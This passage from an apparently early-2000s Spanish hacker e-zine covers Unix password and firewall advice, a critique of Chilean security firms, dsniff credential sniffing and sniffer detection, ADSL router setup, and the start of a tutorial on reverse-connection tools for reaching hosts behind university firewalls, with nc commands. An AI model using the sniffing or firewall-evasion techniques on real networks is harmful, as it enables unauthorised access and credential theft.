en problemas. Los passwords de los usuarios deben ser en  lo posible mayores
de 6 caracteres y contener numeros y letras u otros tipos de  caracteres. Un
crakeador de passwords usado con un diccionario le seria imposible descifrar
un password que no sea una palabra y practicamente imposible a este mismo un
password mayor de 9 digitos que  contenga  numeros, letras  y otros tipos de
caracteres. Un ej. es VTR. Ellos han puesto politicas frente a los passwords
y  estos  deben  tener  un  minimo  de  numeros  y  letras combinados, y ser 
diferentes en el username y el password. Esta resolucion, es cuando uno pide
habilitar el espacio web que dan de hosteo. Otro politica es el cambio de la
passwd  cada cierto  tiempo,  trimestralmente puede ser. Aunque se  tenga un
buen password, y a el mismo se le conocen algunos caracteres por  que pueden
haberlo visto escribiendolo en el teclado, es  mas facil para un pass craker
descifrarlo por brute.


Firewalls
---------

Los Firewalls o Cortafuegos son muy recomendables. Es bueno asegurar que se
este corriendo uno en el gateway de la red, sino, pueden  venir  problemas. 
Estos bloquean cualquier cosa  que unos les pida, incluyendo  ataques ICMP, 
que es el mas comun  cuando uno esta siendo empaquetado. Esto  no significa
que lo va a solucionar el todo, pero  puede reducir y alentar  notablemente
el ataque si se tiene el firewall  adecuado. Algunos software de  firewalls
comunes son  el Freedom, IP Chains y  el Conceal. Tambien  hay firewalls en
hardware y routers. Los mas prestigiosos  son los Cisco  Routers, claro que 
todo depende del dinero que se tenga para poner un mejor  firewall. Algunos
usos del firewall son que derivan los  paquetes, banean IP, warnings, logs,
etc. Una buena combinacion de firewall software, seria ocupar IP Chains con
Port  Sentry. El  primero  routea los paquetes  peligrosos  mientras que el 
segundo logea  conexiones, avisa  de posibles  ataques, nega la  mayoria de 
los escaneos y otras cosas utiles.


Espero que despues de esta  lectura  se  tenga  mas  claro  lo  que  es  la 
seguridad  en  un  sistema  unix. Y  que para  los que  son nuevos en  este 
ambiente, tengan una idea de todas las variantes que hay que  tomar y todas
las medidas que se pueden adoptar  para mejorar la  seguridad. No  hay nada 
mas frustrante que ser admin y ver que alguien mas tambien lo consigio, no?

Se despide... bankzide 

www.est.cl

bankzide@hotmail.com  - (con la muerte de usa.net y  tb de mi otra casilla,
no me quedo otra que el querido y nunca olvidado hotmail xDD)

Saludos: EST,  dNa Clan, filth,  Blackdoom, Kamui-X, aTr, SpX, (liderando la
scena warez en chile xD) a los cabros que se meten al #electron, a los lokos
del  #informatica  de irc.terra y  tb pal #re~aca. Se me olvidan hartos pero
filo, uds saben kiene son, shiaaa xD.



[=========================([ Electron Security Team ])===========================]

 


[====([ _5010_ ])==========================================================EST-4=]
[====([ Empresas de Seguridad ])=============================================#10=]
[========================================================([ s010_@hotmail.com ])=]


 La seguridad informatica es un hecho que en la actualidad esta en apogeo, con los 
llamados "Hacker" o "Llaneros solitarios  de  la  informatica". Su  nacimiento fue
apartir  de  los  80  con  la  salida  de  las  computadoras  personales  y de las 
conecciones remotas(INTERnet y su sucezora ARPAnet  ). Hoy en dia es muy frecuente
encontrar que sitios en Internet hallan sido Crakeados por  estos "Hackers" que en
su mayoria son tan solo jovenes de entre 14 a 21 a~os que buscan el reconocimiento
de entre sus pares  y  lograr  un  cierto "poder en la red", pero  los  verdaderos 
"Hacker" no se dedican a hacer Web Cracker sino por lo general pertenecen a grupos
importantes  en  materia  de seguridad. Hay que poner en claro primero que nada la
diferencia entre un "Hacker"  y  un "Cracker" el primero busca  estudiar, aprender
mas  sobre  los  distintos  Sistemas  Operativos, son  capaces  de  programar  sus
distintas herramientas para lograr haci entra a  un  Sistema, por  otra  parte  el
"Cracker" es un ser mediocre, ocupa las herramientas de otro , no sabe programar y
se dedica  a  cauzar da~o a las empresas donde el ah podido entrar.(no confundir a 
este sujeto con el otro denomido Cracker, ser amante de editores Hexadecimales, de
la ingeneria inversa etc, quien nos da la posibilidad de tener todos los programas
que deciemos sin tener que pagar ni un $$).
Lo que a nosotros concierne es el tema de la seguridad  y  los  que  ayudan  a  la
seguridad, son los "Hackers, ellos por medio de  distintas  tecnicas  que se bazan
en encontrar bug (fallas de seguridad) en  explotarlos por medio de exploit logran
penetrar a los disitintos sistemas y  por  lo  tanto asi lograr mayor seguridad ya 
que al momento de "Hackear" un  sistema casa vez se hace menos vulnerable, pero no
cerremos  nuestros  ojos  por  mas que  nos  digan  que  internet es segura eso es 
totalmente falso ya que al momento de poner  nuestra  linea  telefonica a servicio 
de nuestro ISP entramos a otro  mundo  totalemte  desconocido  en  donde  toda  la 
informacion circula libre para que a si aquellos  que sepen como sacar provecho de
ella la obtengan.

Para hacer mas dificil  la tarea de los "Hackers" y hacer  que  sea  mas seguro un 
sistema se  han creado  distintos  tipos  de  algoritmo que cifran las contrase~as 
creadas por los usuarios una de estos es el llamado DES (Data Encryption Standard)
o en un monento conocido como Lucifer( nombre puesto por IBM), lo que hace esto en
pocas  palabras  es  cifrar  la  palabra 20 veces obteniendo cada ves un resultado
diferente y luego agregarle 2 cifras  de  acuerdo  a  la hora en que fue creada la
passwd ,tambien hay  que decir que DES trabajo en comienzo con bloques de 128 bits
pero en la actualidad trabaja  sobre bloques de 64 bits (modificacion hecha por el
NBS) este tipo de algoritmo biene incluida en los Sistemas Operativo Unix y Linux,
estos sistemas son multitarea y multiusuario  por  lo  cual  necesitan  una  buena 
seguridad, a que me refiero con  multitarea , y multiusuario esto quiere decir que
diferentes personas en distintos puntos pueden usar  un solo PC haciendo distintas
aplicaciones etc,, teniendo por seguridad que sus carpetas o todo lo que ella haga
sera tan solo de su poder nadie mas podra ver lo  que  han  hecho(excepto el super 
usuario llamado root), no como Windows (sistema  operativo  en base Ms-DOS) que es
monotarea y monousuario y mas encima con seguridad minima por no decir nula.

  Por otra parte para que las  empresas y/o  usuarios  de  internet  tengan  mayor 
seguridad se han creado las  llamadas Empresas de seguridad que lo que hacen, como
su nombre lo indica es dedicarse a mantener una  seguridad estable en los sistemas
o Servidores que estan bajo su gustia, para que  asi  nadie  ajeno  a  la  empresa
pueda acceder a los datos de esta misma, pero realmente cumplen su trabajo? , para
comenzar  hablaremos  de  ORION  2000, empresa  nacional  dedicada a la "seguridad 
infomatica" su mision "Prestar servicios profecionales de excelencia en  seguridad
informatica a sus clientes, con el  objetivo de proteger sus  valiosos  activos de
informacion, apoyando el desarrollo de  sus  actuales  y  futuros  negocios", esto 
suena muy bonito pero responde a la pregunta planteada, cumplen su trabajo? por un
punto de vista si, pero es acaso muy dificil parchar un servidor acaso hay que ser
super dotado para  mantener  algo  seguro pues no, tan solo hay que ser agil en el 
sentido de mantenerse al tanto de los ultimos bug, por que la mayoria  de  servers
que han sido "Hackeados" no han sido por la gran genilidad de un "chico" sino  por
la ineptitud de un supesto  y  asi  mismo  llamado "Adminstrador" quien cree saber 
todo por tener un carton  universitario, a lo mejor esto no se cumple un 100% pero
estoy totalmente  seguro  que  por lo menos un 90% si, esto no quiere desmerecer a 
los  "chicos"  que  hayan logrado entrar si no demuestra que ah este pais le falta
mucho  para  poder  decir  " Si, nuestros sistemas son seguros", pero por mientras
tendremos que seguir con la politica del que tiene un  carton  Universitario  sabe
mas que un "chico" de 15 a~os, lo cual mirado por un  cierto punto de vista quizas
si, pero en lo que es conocer de fallos y de como  explotarlos no se la gana nadie
o mejor dicho ningun administrador, volviendo al punto de ORION 2000 , estos tipos
se llenan  la  boca  diciendo  textualmente "Las  vulnerabilidades de los sistemas
aumentan  cada  dia  mas, debido  a  que  las  aplicaciones son mas complejas, los
fabricantes estan mas preocupados de vender  sus  productos que de la seguridad de
estos y hay mas personas investigando y buscando nuevas fallas."

De por cierto ustedes no son esas personas, o acaso  esta "empresa  de  seguridad"
ah ofrecido alguna vez o a  expresado  publicamente  o  mejor dicho a puesto en su
pagina web (http://www.orion.cl) algun  bug, falla, problema, tipo de ataque, etc,
encontrada por ellos? pues no, realmente con lo que  ellos  expresan sobre que hay
gente que investiga  y buscan nuevas fallas, es que esa gente no son ellos, por lo
menos si se dan una vuelta por su web se podran dar cuenta que sus temas  son  muy
semejantes a hispasec, yo le digo a  los  se~ores  de  ORION  2000  han encontrado
alguna vez  alguna  falla  de  seguridad  que  no  sea  parchar? esta interrogante 
quedara siempre en mi mente pero ya todos sabes la respuesta.

Para continuar hablaremos sobre otra "empresa de seguridad" llamada  AC  Security,
sin duda esta empresa tendra mucho que decir en el ambito de  seguridad , extracto
de un folleto de AC  Security , "AC  Security  ha  tomado  la  representacion de 6 
empresas, cuyo ambito  de  accion se define muy brevemente de la siguiente manera:
eSecurity, que posee una herramienta  que permite realizar monitoreos de enveto de
seguridad en tiempo real  ( representacion  exclusiva para chile); CyberGuard, que
es la alternativa mas adecuada  y  competitiva  en  el  mundo  de  los  firewall's 
( representacion exclusiva para  chile);  RedCreek,  que  brinda  dispositivos  de
hardware  y  software  para  la  encriptacion  de  informacion  entre  dos puntos;
VIGILANTE, empresa que suministra Auditorias de  Seguridad  utilizando  mas  de 12
herramientas de ataques, brindando 7 distintos tipos de reportes a analizar por el
cliente  con  la   problematica   detectada;" Se  quedaron  sin  nombrar  Computer 
Associates   y   Invent,   bueno   para   mas   informacion  pueden  dirigirse   a 
http://www.acsecurity.cl , la critica se la dejo en  sus  manos pero como es facil
deducir que hasta el momento AC  Security  da  mas  confianza y por su parte no se 
creen superiores como ORION  2000  siendo obviamente mucho mas que ORION, pero sin
duda la mejor seguridad  es  aquella que se llama informacion ya que si leemos las
ultimas informaciones  y  estamos  al  tanto  de  todo lo que pasa en este ambito, 
estas empresas pasarian hacer nada mas que  del  recuerdo. Pero se preguntaran que
se entiende  por  seguridad  informatica, bueno  se  lo  dejamos  a  cada  uno  de 
ustedes, pero  a  mi  gusto  la  seguridad  no  es  defender  el  PC  con un serco 
electrificado  (  para  que  no  accedan   fisicamente)  ni  tampoo  comprarse  un
InstaGate EX2 (Firewall), sino es pensar  que  la  seguridad  es  tan  solo  tomar 
conciencia de que lo unico  seguro, es  que  la seguridad no es segura, por que si
alguien quiere entrar a algun  Servidor o nuestro PC hay que tenerlo por hecho que
lo hara, depende de nosotros  que tan facil se lo hagamos. 

Cual quier critica sobre este articulo me la pueden enviar a s010_@hotmail.com

					Saludos

								_5010_

Antes que se me olvide un saludo a todas las MADRES del #quake2, tb ah  _AxLr_,
Kunstman,Cotetinha,_CuCh1Ta_,_[Squall]_,Heero y al cara.


[=========================([ Electron Security Team ])===========================]




[====([ carcoco ])=========================================================EST-4=]
[====([ Introduccion a los sniffer's y anti-sniffers ])======================#11=]
[====================================================([ carcoco@grupobbva.net ])=]

Maxima seguridad con dsniff. El sniffer total.

Dsniff   nos demuestra  lo inseguras que  son nuestras  redes,  sobretodo  si nos
empenamos en enviar contrasenas en  formato  texto  plano.  Con este sniffer, nos
daremos cuenta de los realmente importante que puede llegar a ser la  utilizacion
de la encriptacion en nuestras comunicaciones diarias...
   
Tal y como dice el autor del programa Dug Song, el  desarrollo  esta  potentisima
aplicacion para auditar sus propias redes y para demostrar la necesidad   de usar
encriptacion de un modo habitual. "Please do not abuse this software"
   
Gracias a dsniff, tenemos un motivo mas para usar diariamente  herramientas  como
ssh (la version 2, porque  la  1  tiene  algunos  problemas  de  seguridad  y  es
vulnerable) y gpg (Gnu pgp)
   
Para haceros una idea de las posibilidades del dsniff, conectaros a Internet como
lo haceis habitualmente, en otra sesion como root teclear:

# dsniff -i ppp0

Ahora bajaros el correo, entrad en algun servidor/servicio que os pida contrasena
y vereis como por arte de magia vais capturando los pares usuario:contrasena.
   
Entrad ahora usando ssh y vereis como en este caso nuestro sniffer no  captura la
contrasena. ;-)
   
dsniff esta formado por una serie de programas que son:

   * dsniff: simple password sniffer. (Yo realmente no lo consideria nada simple)
   * arpspoof: redirect packets from a target host (or all hosts) on the LAN intended
     for another host on the LAN by forging ARP replies.
   * dnsspoof: forge replies to arbitrary DNS address / pointer queries on the LAN.
   * filesnarf: saves selected files sniffed from NFS traffic in the current working
     directory.
   * macof: flood the local network with random MAC addresses.
   * mailsnarf: a fast and easy way to violate the Electronic Communications Privacy
     Act of 1986 (18 USC 2701-2711), be careful.
   * msgsnarf: record selected messages from sniffed AOL Instant Messenger, ICQ 2000,
     IRC, and Yahoo! Messenger chat sessions.
   * sshmitm: SSH monkey-in-the-middle.
   * tcpkill: kills specified in-progress TCP connections.
   * tcpnice: slow down specified TCP connections via "active" traffic shaping. (Se
     puede usar para evitar virus/gusanos tipo NIMDA). Os recomiendo que os paseis por:
     http://bulmalug.net/body.phtml?nIdNoticia=865
   * urlsnarf: output all requested URLs sniffed from HTTP traffic in CLF (Common Log
     Format, used by almost all web servers), suitable for offline post-processing
   * webmitm: HTTP / HTTPS monkey-in-the-middle.
   * webspy: sends URLs sniffed from a client to your local Netscape browser for
     display, a fun party trick
       
Pagina web del dsniff:
http://www.monkey.org/~dugsong/dsniff/
Ademas de la version actual la 2.3, podemos encontrar una beta de la nueva version
que esta en desarrollo con nuevas caracteristicas.

http://www.monkey.org/~dugsong/dsniff/beta/dsniff-2.4b1.tar.gz
   
Mas informacion:
ftp://www6.software.ibm.com/software/developer/library/s-sniff.pdf
ftp://www6.software.ibm.com/software/developer/library/s-sniff2.pdf
   
   Simplemente I M P R E S I O N A N T E .
   
En el proximo articulo os mostrare como detectar sniffer's en nuestra red local.

- http://bulmalug.net/body.phtml?nIdNoticia=928

Deteccion de sniffers usando Linux
==================================

Un sniffer es un programa que captura todo el trafico que pasa por la red,de forma
que  ejecutado  en  una  red local, permiten  obtener  pares  (usuario:contrasena)
rapidamente.

Suele funcionar de forma pasiva, siendo muy  dificiles de detectar, aunque existen
algunas tecnicas que nos permitiran averiguar si tenemos espias en nuestra red ...
   
Existen multitud de sniffer's  en  Linux, cada  cual  con  sus  peculiaridades  y
caracteristicas, pero uno de los mas potentes y que  mas me gusta, es  dsniff, os
recomiendo la lectura del articulo:Maxima seguridad con dsniff. El sniffer total.

     _________________________________________________________________
   
   Advertencia: Detectar un sniffer es sumamente dificil, por no decir,
   que si esta correctamente configurado y oculto usando otras tecnicas,
   es practicamente imposible detectarlos. Aqui intentare dar algunas
   ideas y consejos para que conozcais de que va el tema.
     _________________________________________________________________
   

Se dan 2 situaciones distintas:
   * Consulta directa de las interfaces de red.
   * NO es posible la consulta directa de las interfaces de red.
       
Consulta directa de las interfaces de red.
   
En el primer caso lo que tendremos que hacer es mirar el estado de las  diferentes
interfaces de redes que tengamos en dicho equipo. La forma mas habitual e utilizar
el comando ifconfig (paquete net-tools), aunque podemos usar otros como ifstatus o
cpm (check for network interfaces in promiscuous mode).
   
Aqui os muestro como el resultado del comando ifconfig antes y despues de ejecutar
el sniffer en una maquina FreeBSD:

$ ifconfig
fxp0: flags=8843<UP,BROADCAST,
      RUNNING,SIMPLEX,MULTICAST> mtu 1500

Estando el sniffer en ejecucion, podemos  ver  en  la  primera  linea  la  palabra
"PROMISC", que nos revela el estado de la tarjeta de red:
$ ifconfig
fxp0: flags=8943<UP,BROADCAST,
      RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500

Normalmente cuando la interface pasa a   modo  promiscuo, queda  reflejado  en  el
fichero de logs, tal y como podemos ver aqui.
# cat /var/log/messages
.
Nov 20 08:51:20 maquineta
         /kernel: fxp0: promiscuous mode enabled
.

Aunque es la forma mas sencilla y directa  de  detectar  un  sniffer, tampoco  es
infalible, puesto que aun estando en marcha el sniffer puede que no  aparezca  la
interfaz como promiscuos sobretodo si han crackeado la maquina y  le  han  metido
un LKM del estilo del RhideS v1.0 (rhides.c en 7a69#12): "Is usualy to install  a
sniffer when you hack some system, but if you do it,the net device is established
to promisc mode and if the admin is inteligent must to discover the sniffer.Using
RhideS you can to hide some promisc mode interface easily.  Inserting  the module
you can specify magic words."
   
Otras posibles medidas para detectar el sniffer son:
  * Controlar y detectar los logs que genera el sniffer.
  * Controlar las conexiones al exterior, por ejemplo,  el  envio  sospechoso  de
    e-mail a cuentas extranas.
  * Utilizar  la  herramienta  lsof  (LiSt Open Files),  de  forma  que  tengamos
    monitorizados los programas que acceden al dispositivo de red.
       
NO es posible la consulta directa de las interfaces de red.
   
En caso de que no podamos acceder y consultar el estado de las interfaces de red,
puesto que el sniffer no esta en nuestra maquina sino que se encuentra en alguna
otra maquina de la red. Lo que tendremos que hacer, es utilizar algun defecto en
la implementacion concreta del protocolo TCP/IP por algun programa/comando  (tal
y como hace el programa neped respecto a el arp) o ingeniarnoslas para averiguar
de alguna forma si tenemos algun sniffer corriendo en la red:
   
"Una de las posibles  tecnicas,  consiste  en  enviar  paquetes  a  una  maquina
inexistente y cuya direccion no esta dada de alta en el servidor de nombres.
Sabremos que tenemos un sniffer en  nuestra  red  si  posteriormente  detectamos
cualquier intento de acceso a la maquina ficticia".
   
Antisniff, del que tenemos incluso el codigo fuentes en la version Unix,  es  una
de las mejores herramientas de deteccion  de  sniffer  de  forma  remota,  aunque
quizas este  un  poquitin  obsoleto,  sobretodo  porque  no  contempla  la  nueva
generacion de sniffers.

AntiSniff is a new class of proactive security monitoring tool.It has the ability
to scan a network and detect whether or not any computers are in promiscuous mode
This is often a sign that  a  computer  has  been  compromised.  With  AntiSniff,
administrators and security teams can finally get a handle  on  who  is  watching
network traffic at their site.
Antisniff was designed to detect compromized machines with IP stacks that a remote
attacker could utilize to sniff network traffic. It was  not  designed  to  detect
hardware based network probes  or  special  purpose  network  analyzers  which  an
attacker would need physical access to install. 
   
Sentinel es otra interesante herramienta, cuyo objetivo principal es
la deteccion remota de sniffers. Utiliza las librerias libcap y libnet
y tenemos el codigo fuente disponible.
The sentinel project is an implementation of effective remote
promiscuous detection techniques.For portability purposes, the
sentinel application uses the libpcap and libnet libraries. 
   
Por ultimo comentar la existencia de una curiosa herramienta:
AntiAntiSniffer Sniffer, cuyo objetivo es detectar la ejecucion en la
red del Antisniff, evitando ser detectado por el mismo.
  
Conclusion: Recordar (una vez mas) la necesidad de usar encriptacion a
diario en TODAS nuestras comunicaciones: S/key, gpg, SSH, SSL,
Firewall, VPNs, etc...
   
Enlaces:
  * dsniff: http://www.monkey.org/~dugsong/dsniff/
  * sniffit: http://reptile.rug.ac.be/~coder/sniffit/sniffit.html
  * net-tools:http://www.tazenda.demon.co.uk/phil/net-tools/
  * neped.c:http://www.securityfocus.com/data/tools/neped.c
  * Ifstatus:
    http://www.ja.net/CERT/Software/ifstatus/ifstatus2.2.tar.gz
  * cpm, ifsolstat: http://www.ja.net/CERT/Software/sniffdetect/
  * 7a69ezine: http://www.7a69ezine.org/
  * lsof: http://freshmeat.net/redir/lsof/6029/url_changelog/
  * Antisniff: http://www.l0pht.com/antisniff/
    http://www.securityfocus.com/data/tools/anti_sniff_researchv1-1-2.tar.gz
  * Sentinel: http://www.packetfactory.net/Projects/sentinel/
  * libnet: http://www.packetfactory.net/Projects/libnet
  * libpcap: http://www.tcpdump.org
  * Anti Antisniff: http://www.securityfocus.com/data/tools/aass.c
  * sniffing-faq: http://www.robertgraham.com/pubs/sniffing-faq.html
  * Sniffing (network wiretap, sniffer) FAQ:
    http://cs.baylor.edu/~donahoo/tools/sniffer/sniffingFAQ.htm

- http://bulmalug.net/body.phtml?nIdNoticia=1016

EST: Saludos a la gente de Bulmalug (www.bulmalug.net), por el apoyo brindado.

[=========================([ Electron Security Team ])===========================]





[====([ Toleran-C & Silen-C ])=============================================EST-4=]
[====([ Configuracion Segura y Optima de la red Adsl/Atm ])==================#12=]
[=========================================([ Toleran-C@hackers.linuxplanet.nu ])=]

Este texto esta escrito unicamente  con fines  didacticos. El autor no  se  hace
responsable  del  mal  uso  que  se  pueda  dar a esta informacion,  ni  se hace
responsable de  los programas que lleve incluidos. Si  el  computador  se quema,
si se borra el disco duro o si un perro te  muerde  al  ejecutarlos, no reclames
al autor.


INTRODUCCION

La  potencia   de  los  computadores  actuales  es  tremendamente superior a esos 
peque~os computadores  que  nos  traen   en  forma  de  routers/modem ADSL y ATM.
Aparte de  la velocidad, con los computadores  actuales podemos controlar toda la
potencia de la linea a nuestro gusto, controlar  mucho  mejor  la  seguridad  del
sistema, control del BandWidth por IP o por servicio (QoS), etc... 
En este articulo  vamos  a  intentar traspasar todas las funciones del  router al 
computador que haga de servidor, por supuesto yo recomiendo que este  tenga linux
si se trata de un PC.

La idea que hay tras de este h4ckx0r, es imponerle al router una IP falsa, que ni
siquiera tenemos  routeada a nuestra LAN, y poner la IP fija verdadera (la que da
Telefonica)en el computador.
Con ello conseguiremos que el router  pase todos los paquetes como si  se tratase
de un modem y ademas  conseguiremos  que los servicios  del router (estadisticas, 
tftp, snmp)... no  puedan ser accesibles desde fuera, ya  que su IP es falsa y no
accesible desde inet.
Ademas, con esta configuracion vamos a conseguir que nuestros raw  sockets viajen 
libremente por la red sin que se queden en el modem/router, y  podremos  utilizar 
utilidades como nmap, hacer spoof, etc...

El problema que tendremos que solucionar es el de la comunicacion entre  router y
host, si ponemos una IP aleatoria al router no podremos accederle como gateway ya
 que su ip no pertenecera a la red local del host.
Por lo tanto la ip del router debe pertenecer obligatoriamente al conjunto de ips 
de la red local del host.
Para perder la cantidad minima de ips de la red del host, la solucion se presenta 
en forma de sub-nets, nos crearemos una subred de 4 ips, una  para  el  host, una 
para el router, una broadcast, y una de red.

Bien, pasemos a la faena:

Ejemplo:
Tenemos 2 computadores en nuestra intranet + 
1 computador que hara de servidor +
un modem/router ADSL con  IP=214.23.112.53
La configuracion que nos "recomienda" telefonica consiste en tener IP's locales
en todos los computadores de la intranet y tener la IP fija  de Internet + 1 ip
local en el router/modem y activar NAT en el router.

Esto es totalmente ineficiente/inseguro, el codigo que llevan la mayoria de los
routers tiene bugs y backdoors por doquier, dejar al alcance  Internet un bicho
semejante se ha de calificar como minimo de muy  peligroso. (Para  ilustrar con 
un ejemplo se me pasa  por  la  cabeza  las  default  communities del snmp, los 
ataques DoS a los CISCO con los GET ? en el servidor http, los errores de stack
y consiguientes bloqueos tras scanneo con nmap -f, y blah blah blah, etc, etc.)


MANOS A LA OBRA

La idea fundamental que  hay tras de la configuracion que queremos  realizar es
la de crear una sub-red que la formara el router/modem y el servidor; para ello
y para ver los maximos ordenadores posibles  pondremos  una  mascara  de subred 
255.255.255.252, esto nos permite tener 4 ips  en la subred, 2 estan reservadas
(ip de red, y  ip  broadcast)  y  las  otras  2  seran  las  que  vayan  en  el 
router/switch y en el computador. En nuestro ejemplo  tendremos  lo  siguiente.

IP que nos da Telefonica 214.23.112.53

configuracion a poner:
IP de red=214.23.112.52
IP 1, ordenador servidor=214.23.112.53
IP 2, ordenador servidor=192.168.0.1
IP modem/router=214.23.112.54
IP broadcast=214.23.112.55
mask=255.255.255.252

IP's ordenadores locales: 192.168.0.x (ejem: 192.168.0.1, 192.168.0.2, 192.168.0.3 )

IP gateway para todos los computadores Intranet 192.168.0.1 si se quiere hacer NAT.
( Gateway sinonimo de Puerta de Enlace )

CONEXIONES

Al PC que hara de servidor le meteremos  2  tarjetas  de  red (con  1  tambien se
podria hacer utilizando las IP Alias, pero  es  mas  ineficiente  por motivos que
se salen del objetivo de este articulo, y hay que tener en cuenta que una tarjeta
de red sale por unos $5.000 en el bio bio ), a una le asignaremos una IP local, y
a la otra le asignaremos la IP de telefonica. Despues le activaremos  el NAT para
que toda la intranet tenga acceso y configuraremos el firewall, el QoS y  todo lo
que queramos.



En el modem/router  le  meteremos  las IP's calculadas de red, local y broadcast, 
pondremos la mascara expuesta arriba y activaremos la funcion router y quitaremos
todas las demas opciones (NAT, firewall, etc...).

Ahora el router es un fantasma inaccesible por internet, aunque  nosotros podemos
llegar hasta el sin  ningun  problema  desde  nuestra  intranet  con la  nueva IP 
asignada.


DIAGRAMA DE RESULTADO FINAL


computador 1
192.168.0.2              server(computador 3)  (NAT/Masqerade)
___       switch/hub        192.168.0.1___
| |-----|_|----------------------------| | 
---      |                            --- 214.23.112.53 
        _|_                     conex.  |
         | |                    directa    |          ipbroadcast=214.23.112.55
        ---                    ethernet  |          ipred=214.23.112.52
        computador 2                 |            mask=255.255.255.252
        192.168.0.3                   /\
                                       /  \ router ADSL
                                      /__\ 214.23.112.54
                                         |
                                         |
                                      INTERNET



CONCLUSIONES

Con esto hemos traspasado todo el poder al ordenador, la seguridad del sistema
ahora esta centralizada y dependera unica y exclusivamente de la configuracion
del ordenador servidor. La unica pega de este H4x0R es que no podremos acceder
a los 3 ordenadores vecinos de  Internet  que  llevan  las IP's 214.23.112.52,
214.23.112.54,214.23.112.55, aunque  con  toda  seguridad estos seran hosts de 
adsl que ni siquiera tendran servicios activos. 





COMO ACCEDER A SERVICIOS EN HOSTS QUE ESTAN DETRAS DE 
PROXYS / NAT / FIREWALLS

INTRODUCCION

Cada vez es mas usual encontrarnos con computadores que solo  tienen salida
a Internet y no permiten conexiones entrantes. Esto  es debido  basicamente
a dos motivos:

1.Falta de IP de Internet (es decir, que el computador va bajo NAT o PROXY)
y el cual solo tiene una IP local.

2.Reglas de Firewall que impiden la entrada de paketes de conexion hacia el
host.


Como se pudo deducir( y algunos facturado),estos computadores solo se pueden 
utilizar  para  conexiones  salientes  de  protocolos  simples, por  ejemplo 
navegar  por la web, hacer ftp's pasivos (los activos no funcionaran como ya
se discutira),etc..
Este hecho nos impide tener servicios de cualquier tipo, y esto  es  lo  que
vamos a intentar H4x0RI4R.

OBJETIVO

Nuestro  objetivo  es  crear  un  programa  que  nos  permita acceder a los 
servicios que hay tras de estos hosts. Ejemplo practicos:

Crear servidores ftp en cualquier ordenador de  la  universidad  accesibles 
desde Internet evitando todos los firewalls de la universidad.

Acceder a todos los ordenadores locales de la universidad  desde  Internet.


Es decir, queremos acceder a todos los servicios de  estos  hosts "ocultos"
desde un ordenador externo,
evitando todos los filtros del firewall o los efectos  colaterales  del NAT 
y PROXYS. 
Para esto, vamos a necesitar:

Ejecutar un programa en uno de los hosts que este detras del proxy/fire que
nos permita entrar desde cualquier lugar de Internet a todos sus  servicios
(http, ftp, etc...), asi como a todos los servicios  de  los  hosts  de  su
intranet.

Como era de esperar necesitaremos crear tambien un programa en el ordenador
cliente desde el que queremos entrar para que todos los programas  clientes
(ftp,navegador,etc...) no se den cuenta del cambio realizado  y  no  tengan 
que preocuparse de ip's locales ni nada por el estilo.

A partir de ahora llamaremos controlador al ordenador que  tiene conexion a
Internet y  quiere  conectarse  a  un  ordenador  que  esta  detras  de  un 
proxy/fire. Llamaremos esclavo al ordenador que esta detras del proxy/fire.

El principio de funcionamiento es  sencillo, el  esclavo  se  conectara  al 
controlador  con  una  conexion  saliente que  evite los firewalls locales.
 A partir de ese momento  el  controlador  a  traves  de  esa conexion dara 
mandatos  al  esclavo  para  recibir  mas  conexiones a los puertos locales 
que el quiera y desde el host y puerto remoto que mande.

Ademas  implementaremos  los  programas  para  que  sean  cliente/servidor, 
multithreaded  y  de  conexion  permanente para utilizar una unica conexioon
para todo tipo  de  servicios  y  con  multiples conexiones y con multiples
esclavos distintos, tambien vigilaremos bien la reconexion de esa  conexion
principal, ya que es el unico lazo que nos une con los esclavos.

Para comenzar implementaremos el  programa  controlador  para  linux, y  el 
programa esclavo para ordenadores que corran Windows 9X/NT/2000, ya que son
lo que normalmente nos vamos a encontrar en todos sitios.

Antes de comenzar en faena, para seguir este articulo vais a  necesitar una 
aplicacion muy simple y muy util utilizada desde tiempo ha en sistemas UNIX 
y portada recientemente  a Windows por el extraordinario grupo Lopht. 
Bajadlo gratuitamente de su pagina.

El programa servidor de linux tiene como nombre server.c, consiste un daemon 
que recogera todas las conexiones de los esclavos y  tambien de los clientes
y hara de intercomunicador entre ellos.
Los programas clientes  de  Windows  tienen como nombre pilladorftp.c(nombre 
totalmente  inapropiado  por  que no tiene  nada  que  ver  con  el  ftp)  y 
datapipeinverso.c.
 
El programa pilladorftp.c establecera la conexion principal con el controlador
y cuando  reciba  un  mandato  llamara  a  datapipeinverso para que bouncee la
conexion a donde le halla dicho el controlador.
Lo mejor para entender el funcionamiento es ver el ejemplo:



EJEMPLO DE FUNCIONAMIENTO

Los programas de Windows se han de meter juntos en el mismo directorio.

Ejemplo:
servidor: ip= 200.200.200.200

esclavo: ip local= 192.168.0.1
	gateway= 201.201.201.201 

Vamos a acceder al servicio telnet del esclavo desde cualquier punto de internet 
para ello hacemos:

En el linux: 
Server 7000	(el programa escuchara en el 7000 a conexiones de esclavos)

En el Windows:
pilladorftp 200.200.200.200 (el Windows lanza una conexion al servidor para 
recibir ordenes)

Ya tenemos la comunicacion principal, ahora podemos dedicarnos a acceder 
a servicios.

En linux:
nc -l -p 8000 -v

y en otro shell:
nc 127.0.0.1 7000
y escribimos lo siguiente:
CONTROL201.201.201.201REDIRECCIONAPUERTO200.200.200.2000800000023127.000.000.001 [INTRO]

al hacer esto veremos como nos aparece en la shell del puerto 8000 el servicio
telnet desde el cual ya podremos acceder.

La explicacion de la sentencia de control que le llega al controlador es la 
siguiente:

CONTROL(IP-esclavo-gtway)REDIRECCIONAPUERTO(IP-Server)(portserver)(puertolocal)(hostbounce)

Las IPS contendran siempre 15 digitos y los puertos siempre 5 digitos.


PROTOCOLOS DE SERVIDORES ESPECIALES (FTP)

Hay protocolos  como  el  ftp  donde  hay informacion del protocolo de red en el 
protocolo de aplicacion, esto  evidentemente  da problemas en los firewalls y en
muchos routers que solo tratan IP.
Para este  tipo  de  protocolos el programa controlador se ha de hacer especiail 
para que saque  toda la informacion de red desde los datos. Esto se puede ver en 
el codigo fuente del programa emuladorftp.c que  tambien implemente para acceder 
a servicios ftp en los hosts esclavos.
Este programa soporta las conexiones PASV del ftp creando conexiones nuevas...

El funcionamiento seria el siguiente:


Ejemplo:
servidor: ip= 200.200.200.200

esclavo: ip local= 192.168.0.1
	gateway= 201.201.201.201 


En el linux: 
Server 7000	(el programa escuchara en el 7000 a conexiones de esclavos)

En el Windows:
pilladorftp 200.200.200.200 (el Windows lanza una conexion al servidor para
recibir ordenes)

